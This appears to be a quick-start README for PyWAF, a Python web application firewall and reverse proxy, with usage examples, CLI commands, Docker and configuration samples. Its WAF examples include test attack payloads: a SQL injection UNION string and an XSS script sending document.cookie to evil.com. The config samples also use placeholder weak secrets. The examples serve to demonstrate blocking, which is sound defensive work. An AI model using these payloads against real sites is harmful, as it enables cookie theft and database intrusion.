# 🚀 PyWAF Quick Start Guide

**Enterprise-grade Web Application Firewall & Reverse Proxy in Python**

A complete, production-ready implementation featuring OWASP Top 10 protection, advanced reverse proxy capabilities, SSL/TLS management, and comprehensive monitoring.

---

## 📋 Table of Contents

- [🚀 Quick Installation](#-quick-installation)
- [⚡ 5-Minute Setup](#-5-minute-setup)
- [🛡️ WAF Protection Examples](#️-waf-protection-examples)
- [🔄 Reverse Proxy Examples](#-reverse-proxy-examples)
- [🔒 SSL Management Examples](#-ssl-management-examples)
- [📊 Monitoring & Metrics Examples](#-monitoring--metrics-examples)
- [⚙️ CLI Usage Examples](#️-cli-usage-examples)
- [🌐 REST API Examples](#-rest-api-examples)
- [🐳 Docker Deployment](#-docker-deployment)
- [🔧 Advanced Configuration](#-advanced-configuration)

---

## 🚀 Quick Installation

### Prerequisites
```bash
# Python 3.9+ required
python --version

# Install dependencies
pip install fastapi uvicorn httpx aiohttp pydantic pydantic-settings PyYAML \
           prometheus-client structlog rich netaddr geoip2 limits typer \
           PyJWT cryptography aiofiles redis psutil
```

### Install PyWAF
```bash
# Clone and setup
git clone <repository-url>
cd python_implementation

# Verify installation
python test_implementation.py
```

**Expected Output:**
```
🎉 All tests passed! PyWAF implementation is working correctly.
```

---

## ⚡ 5-Minute Setup

### Step 1: Start the Server
```bash
# Start with default configuration
python -m pywaf.main

# Or with custom config
python -m pywaf.main --config custom-config.yaml --host 0.0.0.0 --port 8080
```

### Step 2: Verify It's Working
```bash
# Test WAF protection
curl -X POST http://localhost:8080/api/test \
     -H "Content-Type: application/json" \
     -d '{"comment": "<script>alert(1)</script>"}'

# Expected: 403 Forbidden (XSS blocked)
```

### Step 3: Access Management
- **Admin API**: http://localhost:8081/admin/docs
- **Metrics**: http://localhost:9090/metrics
- **Health Check**: http://localhost:8080/health

---

## 🛡️ WAF Protection Examples

### Basic WAF Usage

```python
import asyncio
from pywaf.core.waf import WAFEngine, RequestContext
from pywaf.core.config import Config

async def protect_application():
    # Load configuration
    config = Config.load_from_file("config/config.yaml")
    
    # Initialize WAF
    waf = WAFEngine(config)
    
    # Create request context
    request = RequestContext(
        client_ip="192.168.1.100",
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        method="POST",
        path="/api/login",
        query_string="",
        headers={"content-type": "application/json"},
        body=b'{"username": "admin", "password": "password"}'
    )
    
    # Inspect request
    result = await waf.inspect_request(request)
    
    print(f"Action: {result.action}")
    print(f"Message: {result.message}")
    print(f"Confidence: {result.confidence}")
    
    return result.action.name == "ALLOW"

# Run protection
if asyncio.run(protect_application()):
    print("✅ Request allowed")
else:
    print("🚫 Request blocked")
```

### SQL Injection Protection

```python
async def test_sql_injection_protection():
    config = Config.load_from_file("config/config.yaml")
    waf = WAFEngine(config)
    
    # Malicious SQL injection attempt
    malicious_request = RequestContext(
        client_ip="203.0.113.42",
        user_agent="curl/7.68.0",
        method="GET",
        path="/api/users",
        query_string="id=1' UNION SELECT * FROM users WHERE '1'='1",
        headers={"host": "example.com"}
    )
    
    result = await waf.inspect_request(malicious_request)
    
    if result.action.name == "BLOCK":
        print(f"🛡️ SQL Injection blocked: {result.message}")
        print(f"🎯 Rule triggered: {result.rule_name}")
        print(f"🔍 Confidence: {result.confidence:.2f}")
    
    # Get WAF statistics
    stats = waf.get_statistics()
    print(f"📊 Total blocks: {stats['requests_blocked']}")
    print(f"📊 SQL injection blocks: {stats['sql_injection_blocked']}")

asyncio.run(test_sql_injection_protection())
```

### XSS Protection

```python
async def test_xss_protection():
    config = Config.load_from_file("config/config.yaml")
    waf = WAFEngine(config)
    
    # XSS attack attempt
    xss_request = RequestContext(
        client_ip="198.51.100.42",
        user_agent="Mozilla/5.0",
        method="POST",
        path="/api/comment",
        query_string="",
        headers={"content-type": "application/json"},
        body=b'{"comment": "<script>document.location=\\"http://evil.com/\\" + document.cookie</script>"}'
    )
    
    result = await waf.inspect_request(xss_request)
    
    if result.action.name == "BLOCK":
        print(f"🛡️ XSS Attack blocked!")
        print(f"📝 Pattern detected: {result.pattern}")
        print(f"🎯 Confidence: {result.confidence}")

asyncio.run(test_xss_protection())
```

### Bot Detection

```python
async def test_bot_detection():
    config = Config.load_from_file("config/config.yaml")
    waf = WAFEngine(config)
    
    # Suspicious bot request
    bot_request = RequestContext(
        client_ip="192.0.2.42",
        user_agent="BadBot/1.0 (automated scraper; +http://badbot.com/bot)",
        method="GET",
        path="/api/data",
        query_string="",
        headers={
            "host": "example.com",
            "x-forwarded-for": "192.0.2.42"
        }
    )
    
    result = await waf.inspect_request(bot_request)
    
    print(f"🤖 Bot detection result: {result.action}")
    print(f"📊 Bot score: {result.bot_score}")
    print(f"🔍 Detection reason: {result.message}")

asyncio.run(test_bot_detection())
```

---

## 🔄 Reverse Proxy Examples

### Basic Proxy Setup

```python
import asyncio
from pywaf.core.proxy import ReverseProxy
from pywaf.core.config import Config

async def setup_reverse_proxy():
    config = Config.load_from_file("config/config.yaml")
    proxy = ReverseProxy(config)
    
    # Get proxy status
    stats = proxy.get_statistics()
    print(f"🔄 Proxy Statistics:")
    print(f"   Total requests: {stats['total_requests']}")
    print(f"   Success rate: {stats['successful_requests']/(stats['total_requests'] or 1)*100:.1f}%")
    print(f"   Cache hit rate: {stats['cache_hits']/(stats['cache_hits'] + stats['cache_misses'] or 1)*100:.1f}%")
    
    # Get upstream status
    upstreams = proxy.get_upstream_status()
    for name, info in upstreams.items():
        print(f"🎯 {name}: {info['healthy_servers']}/{info['total_servers']} healthy servers")
        print(f"   Load balancing: {info['algorithm']}")
    
    await proxy.stop()

asyncio.run(setup_reverse_proxy())
```

### Load Balancing Example

```python
async def demonstrate_load_balancing():
    config = Config.load_from_file("config/config.yaml")
    proxy = ReverseProxy(config)
    
    # Simulate multiple requests
    for i in range(5):
        # This would typically be called by FastAPI middleware
        # showing which server would be selected
        upstream = proxy.load_balancer.get_upstream("backend")
        server = upstream.get_next_server()
        
        if server:
            print(f"Request {i+1} → {server.host}:{server.port}")
        else:
            print(f"Request {i+1} → No healthy servers available")
    
    await proxy.stop()

asyncio.run(demonstrate_load_balancing())
```

### Caching Example

```python
async def demonstrate_caching():
    config = Config.load_from_file("config/config.yaml")
    proxy = ReverseProxy(config)
    
    # Cache a response
    cache_key = "api:users:page=1"
    response_data = {
        "users": [{"id": 1, "name": "Alice"}, {"id": 2, "name": "Bob"}],
        "total": 2
    }
    
    await proxy.cache.set(cache_key, response_data, ttl=300)
    print(f"✅ Cached response for key: {cache_key}")
    
    # Retrieve from cache
    cached_data = await proxy.cache.get(cache_key)
    if cached_data:
        print(f"🎯 Cache hit! Retrieved: {len(cached_data.get('users', []))} users")
    
    # Get cache statistics
    cache_stats = proxy.cache.get_stats()
    print(f"📊 Cache Stats:")
    print(f"   Hit rate: {cache_stats['hit_rate']:.1f}%")
    print(f"   Memory entries: {cache_stats['memory_entries']}")
    print(f"   Memory size: {cache_stats['memory_size_bytes']} bytes")
    
    await proxy.stop()

asyncio.run(demonstrate_caching())
```

---

## 🔒 SSL Management Examples

### Basic SSL Setup

```python
import asyncio
from pywaf.core.ssl import SSLManager
from pywaf.core.config import Config

async def setup_ssl():
    config = Config.load_from_file("config/config.yaml")
    
    # Enable SSL for demo
    config.ssl.enabled = True
    config.ssl.auto_provision = False
    config.ssl.cert_file = "/path/to/cert.pem"
    config.ssl.key_file = "/path/to/key.pem"
    
    ssl_manager = SSLManager(config)
    await ssl_manager.initialize()
    
    # Get SSL statistics
    stats = ssl_manager.get_statistics()
    print(f"🔒 SSL Status:")
    print(f"   Enabled: {stats['ssl_enabled']}")
    print(f"   Auto-provisioning: {stats['auto_provision']}")
    print(f"   Certificates: {stats['total_certificates']}")
    print(f"   Valid certificates: {stats['valid_certificates']}")
    print(f"   Expiring soon: {stats['expiring_certificates']}")
    
    await ssl_manager.cleanup()

asyncio.run(setup_ssl())
```

### Let's Encrypt Auto-Provisioning

```python
async def setup_letsencrypt():
    config = Config.load_from_file("config/config.yaml")
    
    # Configure Let's Encrypt
    config.ssl.enabled = True
    config.ssl.auto_provision = True
    config.ssl.acme_email = "admin@yourdomain.com"
    config.ssl.domains = ["yourdomain.com", "www.yourdomain.com"]
    config.ssl.acme_directory = "https://acme-v02.api.letsencrypt.org/directory"
    
    ssl_manager = SSLManager(config)
    await ssl_manager.initialize()
    
    print("🔒 Let's Encrypt auto-provisioning configured")
    print("📜 Certificates will be automatically requested and renewed")
    
    await ssl_manager.cleanup()

# Note: This requires actual domain ownership and DNS configuration
# asyncio.run(setup_letsencrypt())
```

---

## 📊 Monitoring & Metrics Examples

### Metrics Collection

```python
import asyncio
from pywaf.monitoring.metrics import MetricsCollector
from pywaf.core.config import Config

async def collect_metrics():
    config = Config.load_from_file("config/config.yaml")
    metrics = MetricsCollector(config)
    await metrics.initialize()
    
    # Record some sample metrics
    await metrics.record_request("GET", "/api/users", 200, 0.045)
    await metrics.record_request("POST", "/api/login", 200, 0.120)
    await metrics.record_request("GET", "/api/nonexistent", 404, 0.010)
    
    # Record WAF events
    await metrics.record_waf_event("block", "sql_injection", "192.168.1.200")
    await metrics.record_waf_event("block", "xss", "203.0.113.42")
    await metrics.record_waf_event("allow", None, "192.168.1.100")
    
    # Get statistics
    stats = metrics.get_statistics()
    print(f"📊 Metrics Summary:")
    print(f"   Total requests: {stats['requests']['total']}")
    print(f"   Request rate: {stats['requests']['rate_per_second']:.1f} req/s")
    print(f"   Average response time: {stats['requests']['average_response_time_ms']:.1f} ms")
    print(f"   WAF blocks: {stats['waf']['total_blocks']}")
    print(f"   System CPU: {stats['system']['cpu_percent']:.1f}%")
    print(f"   System memory: {stats['system']['memory_percent']:.1f}%")
    
    # Generate Prometheus metrics
    prometheus_metrics = await metrics.generate_metrics()
    print(f"📈 Prometheus metrics: {len(prometheus_metrics)} bytes")
    
    await metrics.cleanup()

asyncio.run(collect_metrics())
```

### Health Monitoring

```python
import asyncio
from pywaf.monitoring.health import HealthChecker, HealthStatus
from pywaf.core.config import Config

async def monitor_health():
    config = Config.load_from_file("config/config.yaml")
    health = HealthChecker(config)
    
    # Run individual health checks
    health_checks = ["system", "disk_space", "memory", "network"]
    
    for check_name in health_checks:
        result = await health.run_health_check(check_name)
        status_icon = {
            HealthStatus.HEALTHY: "✅",
            HealthStatus.DEGRADED: "⚠️",
            HealthStatus.UNHEALTHY: "❌"
        }.get(result.status, "❓")
        
        print(f"{status_icon} {check_name}: {result.status.value} - {result.message}")
    
    # Overall health assessment
    overall = await health.check_all_health()
    print(f"\n🏥 Overall Health: {overall.status.value}")
    print(f"📋 Summary: {overall.summary['healthy']}/{overall.summary['total']} checks healthy")
    
    # Get detailed results
    for component, result in overall.results.items():
        if result.status != HealthStatus.HEALTHY:
            print(f"⚠️  Issue with {component}: {result.message}")

asyncio.run(monitor_health())
```

---

## ⚙️ CLI Usage Examples

### Server Management

```bash
# Start server with custom configuration
python -m pywaf.cli server start --config config/config.yaml --port 8080

# Check server status
python -m pywaf.cli server status

# Stop server gracefully
python -m pywaf.cli server stop

# Reload configuration without restart
python -m pywaf.cli server reload --config config/new-config.yaml
```

### Configuration Management

```bash
# Validate configuration
python -m pywaf.cli config validate --config config/config.yaml

# Show configuration summary
python -m pywaf.cli config summary --config config/config.yaml

# Generate default configuration
python -m pywaf.cli config generate --output new-config.yaml

# Test configuration changes
python -m pywaf.cli config test --config config/config.yaml --dry-run
```

### WAF Management

```bash
# Show WAF status and statistics
python -m pywaf.cli waf status

# Enable/disable WAF rules
python -m pywaf.cli waf rule enable --name sql_injection_protection
python -m pywaf.cli waf rule disable --name bot_protection

# List all WAF rules
python -m pywaf.cli waf rules list

# Update WAF rules from file
python -m pywaf.cli waf rules update --file custom-rules.yaml

# Test WAF against sample requests
python -m pywaf.cli waf test --input test-requests.json
```

### SSL Management

```bash
# Generate self-signed certificate
python -m pywaf.cli ssl generate --domain localhost --output certs/

# Request Let's Encrypt certificate
python -m pywaf.cli ssl request --domain yourdomain.com --email admin@yourdomain.com

# Check certificate status
python -m pywaf.cli ssl status --domain yourdomain.com

# Renew certificates
python -m pywaf.cli ssl renew --check-expiry 30

# List all certificates
python -m pywaf.cli ssl list
```

### Monitoring Commands

```bash
# Show real-time metrics
python -m pywaf.cli monitor metrics --follow

# Check system health
python -m pywaf.cli monitor health

# Export metrics to file
python -m pywaf.cli monitor export --format prometheus --output metrics.txt

# Show proxy statistics
python -m pywaf.cli proxy stats

# List upstream servers and their health
python -m pywaf.cli proxy upstreams
```

---

## 🌐 REST API Examples

### Admin API Usage

```python
import httpx
import asyncio

async def use_admin_api():
    async with httpx.AsyncClient() as client:
        # Login to get token
        login_response = await client.post(
            "http://localhost:8081/admin/auth/login",
            json={"username": "admin", "password": "your_password"}
        )
        token = login_response.json()["access_token"]
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # Get system status
        status_response = await client.get(
            "http://localhost:8081/admin/system/status",
            headers=headers
        )
        status = status_response.json()
        print(f"System Status: {status['status']}")
        
        # Get WAF statistics
        waf_response = await client.get(
            "http://localhost:8081/admin/waf/stats",
            headers=headers
        )
        waf_stats = waf_response.json()
        print(f"WAF Blocks: {waf_stats['requests_blocked']}")
        
        # Update configuration
        config_response = await client.put(
            "http://localhost:8081/admin/config",
            headers=headers,
            json={
                "waf": {
                    "enabled": True,
                    "mode": "block",
                    "owasp_protection": True
                }
            }
        )
        print("Configuration updated")
        
        # Get metrics
        metrics_response = await client.get(
            "http://localhost:8081/admin/metrics",
            headers=headers
        )
        metrics = metrics_response.json()
        print(f"Total Requests: {metrics['requests']['total']}")

asyncio.run(use_admin_api())
```

### Webhook Integration

```python
async def setup_webhooks():
    async with httpx.AsyncClient() as client:
        # Configure webhook for security events
        webhook_config = {
            "url": "https://your-monitoring-system.com/webhook",
            "events": ["waf.block", "ssl.certificate_expiry", "system.health_degraded"],
            "secret": "your-webhook-secret",
            "retry_count": 3,
            "timeout": 10
        }
        
        response = await client.post(
            "http://localhost:8081/admin/webhooks",
            headers=headers,
            json=webhook_config
        )
        
        if response.status_code == 201:
            print("✅ Webhook configured successfully")
            webhook_id = response.json()["id"]
            
            # Test webhook
            test_response = await client.post(
                f"http://localhost:8081/admin/webhooks/{webhook_id}/test",
                headers=headers
            )
            print(f"📡 Webhook test: {test_response.status_code}")

# asyncio.run(setup_webhooks())
```

---

## 🐳 Docker Deployment

### Quick Docker Setup

```bash
# Build the Docker image
cd python_implementation
docker build -t pywaf:latest .

# Run with default configuration
docker run -p 8080:8080 -p 8081:8081 -p 9090:9090 pywaf:latest

# Run with custom configuration
docker run \
  -p 8080:8080 -p 8081:8081 -p 9090:9090 \
  -v $(pwd)/config:/app/config \
  -v $(pwd)/certs:/app/certs \
  -e PYWAF_CONFIG=/app/config/production.yaml \
  pywaf:latest
```

### Docker Compose with Monitoring Stack

```yaml
# docker-compose.yml
version: '3.8'

services:
  pywaf:
    build: .
    ports:
      - "8080:8080"
      - "8081:8081" 
      - "9090:9090"
    volumes:
      - ./config:/app/config
      - ./certs:/app/certs
    environment:
      - PYWAF_CONFIG=/app/config/config.yaml
      - PYWAF_LOG_LEVEL=INFO
    depends_on:
      - redis
      - prometheus
    restart: unless-stopped

  redis:
    image: redis:alpine
    ports:
      - "6379:6379"
    restart: unless-stopped

  prometheus:
    image: prom/prometheus
    ports:
      - "9091:9090"
    volumes:
      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.path=/prometheus'
    restart: unless-stopped

  grafana:
    image: grafana/grafana
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - grafana-data:/var/lib/grafana
    restart: unless-stopped

volumes:
  grafana-data:
```

```bash
# Deploy the full stack
docker-compose up -d

# View logs
docker-compose logs -f pywaf

# Scale PyWAF instances
docker-compose up -d --scale pywaf=3
```

---

## 🔧 Advanced Configuration

### Production Configuration Example

```yaml
# config/production.yaml
environment: production
debug: false

server:
  host: "0.0.0.0"
  port: 8080
  workers: 8
  max_connections: 10000
  keepalive_timeout: 75

ssl:
  enabled: true
  auto_provision: true
  acme_email: "admin@yourdomain.com"
  domains:
    - "yourdomain.com"
    - "www.yourdomain.com"
  acme_directory: "https://acme-v02.api.letsencrypt.org/directory"
  cert_dir: "/app/certs"
  renewal_days: 30

waf:
  enabled: true
  mode: "block"
  
  # OWASP Protection
  owasp_protection:
    enabled: true
    sql_injection_threshold: 0.8
    xss_threshold: 0.8
    rce_threshold: 0.9
    path_traversal_threshold: 0.8
  
  # Rate Limiting  
  rate_limiting:
    global_limit:
      requests_per_second: 1000
      requests_per_minute: 10000
      burst: 100
    per_ip_limit:
      requests_per_second: 10
      requests_per_minute: 100
      burst: 20
  
  # Bot Protection
  bot_protection:
    enabled: true
    detection_threshold: 0.7
    challenge_threshold: 0.5
    blocked_user_agents:
      - "BadBot*"
      - "*scraper*"
      - "*crawler*"
  
  # Geo-blocking
  geo_blocking:
    enabled: true
    blocked_countries: ["CN", "RU", "KP"]
    allowed_countries: []
    geoip_database: "/app/geoip/GeoLite2-Country.mmdb"

proxy:
  upstreams:
    - name: "backend"
      algorithm: "least_connections"
      health_check:
        enabled: true
        path: "/health"
        interval: 30
        timeout: 5
        healthy_threshold: 2
        unhealthy_threshold: 3
      servers:
        - host: "app1.internal"
          port: 3000
          weight: 1
        - host: "app2.internal" 
          port: 3000
          weight: 1
        - host: "app3.internal"
          port: 3000
          weight: 2
  
  routes:
    - pattern: "/api/*"
      upstream: "backend"
      timeout: 30
      cache_ttl: 300
    - pattern: "/*"
      upstream: "backend"
      timeout: 10
      cache_ttl: 0
  
  # Caching
  caching:
    enabled: true
    memory_cache:
      max_size: 1000000000  # 1GB
      max_entries: 100000
    redis_cache:
      enabled: true
      host: "redis"
      port: 6379
      db: 0

admin:
  enabled: true
  host: "0.0.0.0"
  port: 8081
  auth:
    enabled: true
    secret_key: "your-secret-key-change-this"
    algorithm: "HS256"
    access_token_expire_minutes: 60
  cors:
    allow_origins: ["https://yourdomain.com"]
    allow_methods: ["GET", "POST", "PUT", "DELETE"]

metrics:
  enabled: true
  port: 9090
  path: "/metrics"
  
logging:
  level: "INFO"
  format: "structured"
  file: "/var/log/pywaf/pywaf.log"
  max_size: "100MB"
  backup_count: 10
```

### Custom Rules Example

```yaml
# custom-rules.yaml
custom_rules:
  - name: "block_php_files"
    enabled: true
    priority: 50
    action: "block"
    conditions:
      - type: "path"
        operator: "matches"
        value: ".*\\.php$"
    message: "PHP files are not allowed"
    
  - name: "rate_limit_api"
    enabled: true
    priority: 75
    action: "challenge"
    conditions:
      - type: "path"
        operator: "starts_with"
        value: "/api/"
      - type: "rate_limit"
        operator: "exceeds"
        value: "100/minute"
    message: "API rate limit exceeded"
    
  - name: "block_suspicious_headers"
    enabled: true
    priority: 25
    action: "block"
    conditions:
      - type: "header"
        name: "X-Forwarded-Proto"
        operator: "contains"
        value: "javascript:"
    message: "Suspicious header detected"
```

### Load Testing Example

```python
# load_test.py
import asyncio
import aiohttp
import time
from concurrent.futures import ThreadPoolExecutor

async def load_test():
    """Simple load test to verify PyWAF performance"""
    
    async def make_request(session, url, payload=None):
        try:
            if payload:
                async with session.post(url, json=payload) as response:
                    return response.status
            else:
                async with session.get(url) as response:
                    return response.status
        except Exception as e:
            return 0
    
    # Test configuration
    base_url = "http://localhost:8080"
    concurrent_requests = 100
    total_requests = 1000
    
    connector = aiohttp.TCPConnector(limit=200, limit_per_host=100)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(
        connector=connector, 
        timeout=timeout
    ) as session:
        
        print(f"🚀 Starting load test:")
        print(f"   Target: {base_url}")
        print(f"   Concurrent requests: {concurrent_requests}")
        print(f"   Total requests: {total_requests}")
        
        start_time = time.time()
        
        # Create request tasks
        tasks = []
        for i in range(total_requests):
            if i % 10 == 0:  # Every 10th request includes payload
                payload = {"test": "data", "request_id": i}
                task = make_request(session, f"{base_url}/api/test", payload)
            else:
                task = make_request(session, f"{base_url}/health")
            
            tasks.append(task)
            
            # Control concurrency
            if len(tasks) >= concurrent_requests:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                successful = sum(1 for r in results if isinstance(r, int) and r == 200)
                print(f"   Batch completed: {successful}/{len(tasks)} successful")
                tasks = []
        
        # Process remaining tasks
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            successful = sum(1 for r in results if isinstance(r, int) and r == 200)
            print(f"   Final batch: {successful}/{len(tasks)} successful")
        
        end_time = time.time()
        duration = end_time - start_time
        rps = total_requests / duration
        
        print(f"\n📊 Load test results:")
        print(f"   Duration: {duration:.2f} seconds")
        print(f"   Requests per second: {rps:.2f}")
        print(f"   Average response time: {(duration/total_requests)*1000:.2f}ms")

# Run load test
if __name__ == "__main__":
    asyncio.run(load_test())
```

---

## 🎯 Next Steps

1. **Production Deployment**: Use the Docker Compose setup with proper SSL certificates
2. **Monitoring Setup**: Configure Prometheus and Grafana dashboards
3. **Security Hardening**: Review and customize WAF rules for your application
4. **Performance Tuning**: Adjust worker counts, connection limits, and caching settings
5. **Integration**: Connect to your existing monitoring and alerting systems

## 📚 Additional Resources

- **Configuration Reference**: See `config/config.yaml` for all options
- **API Documentation**: Visit `/admin/docs` when admin API is running
- **Monitoring**: Access Prometheus metrics at `/metrics`
- **Health Checks**: Monitor system health at `/health`

---

**🚀 Ready to deploy enterprise-grade web application protection!**

For support and advanced configuration, refer to the complete documentation or reach out to the Deepskilling team.
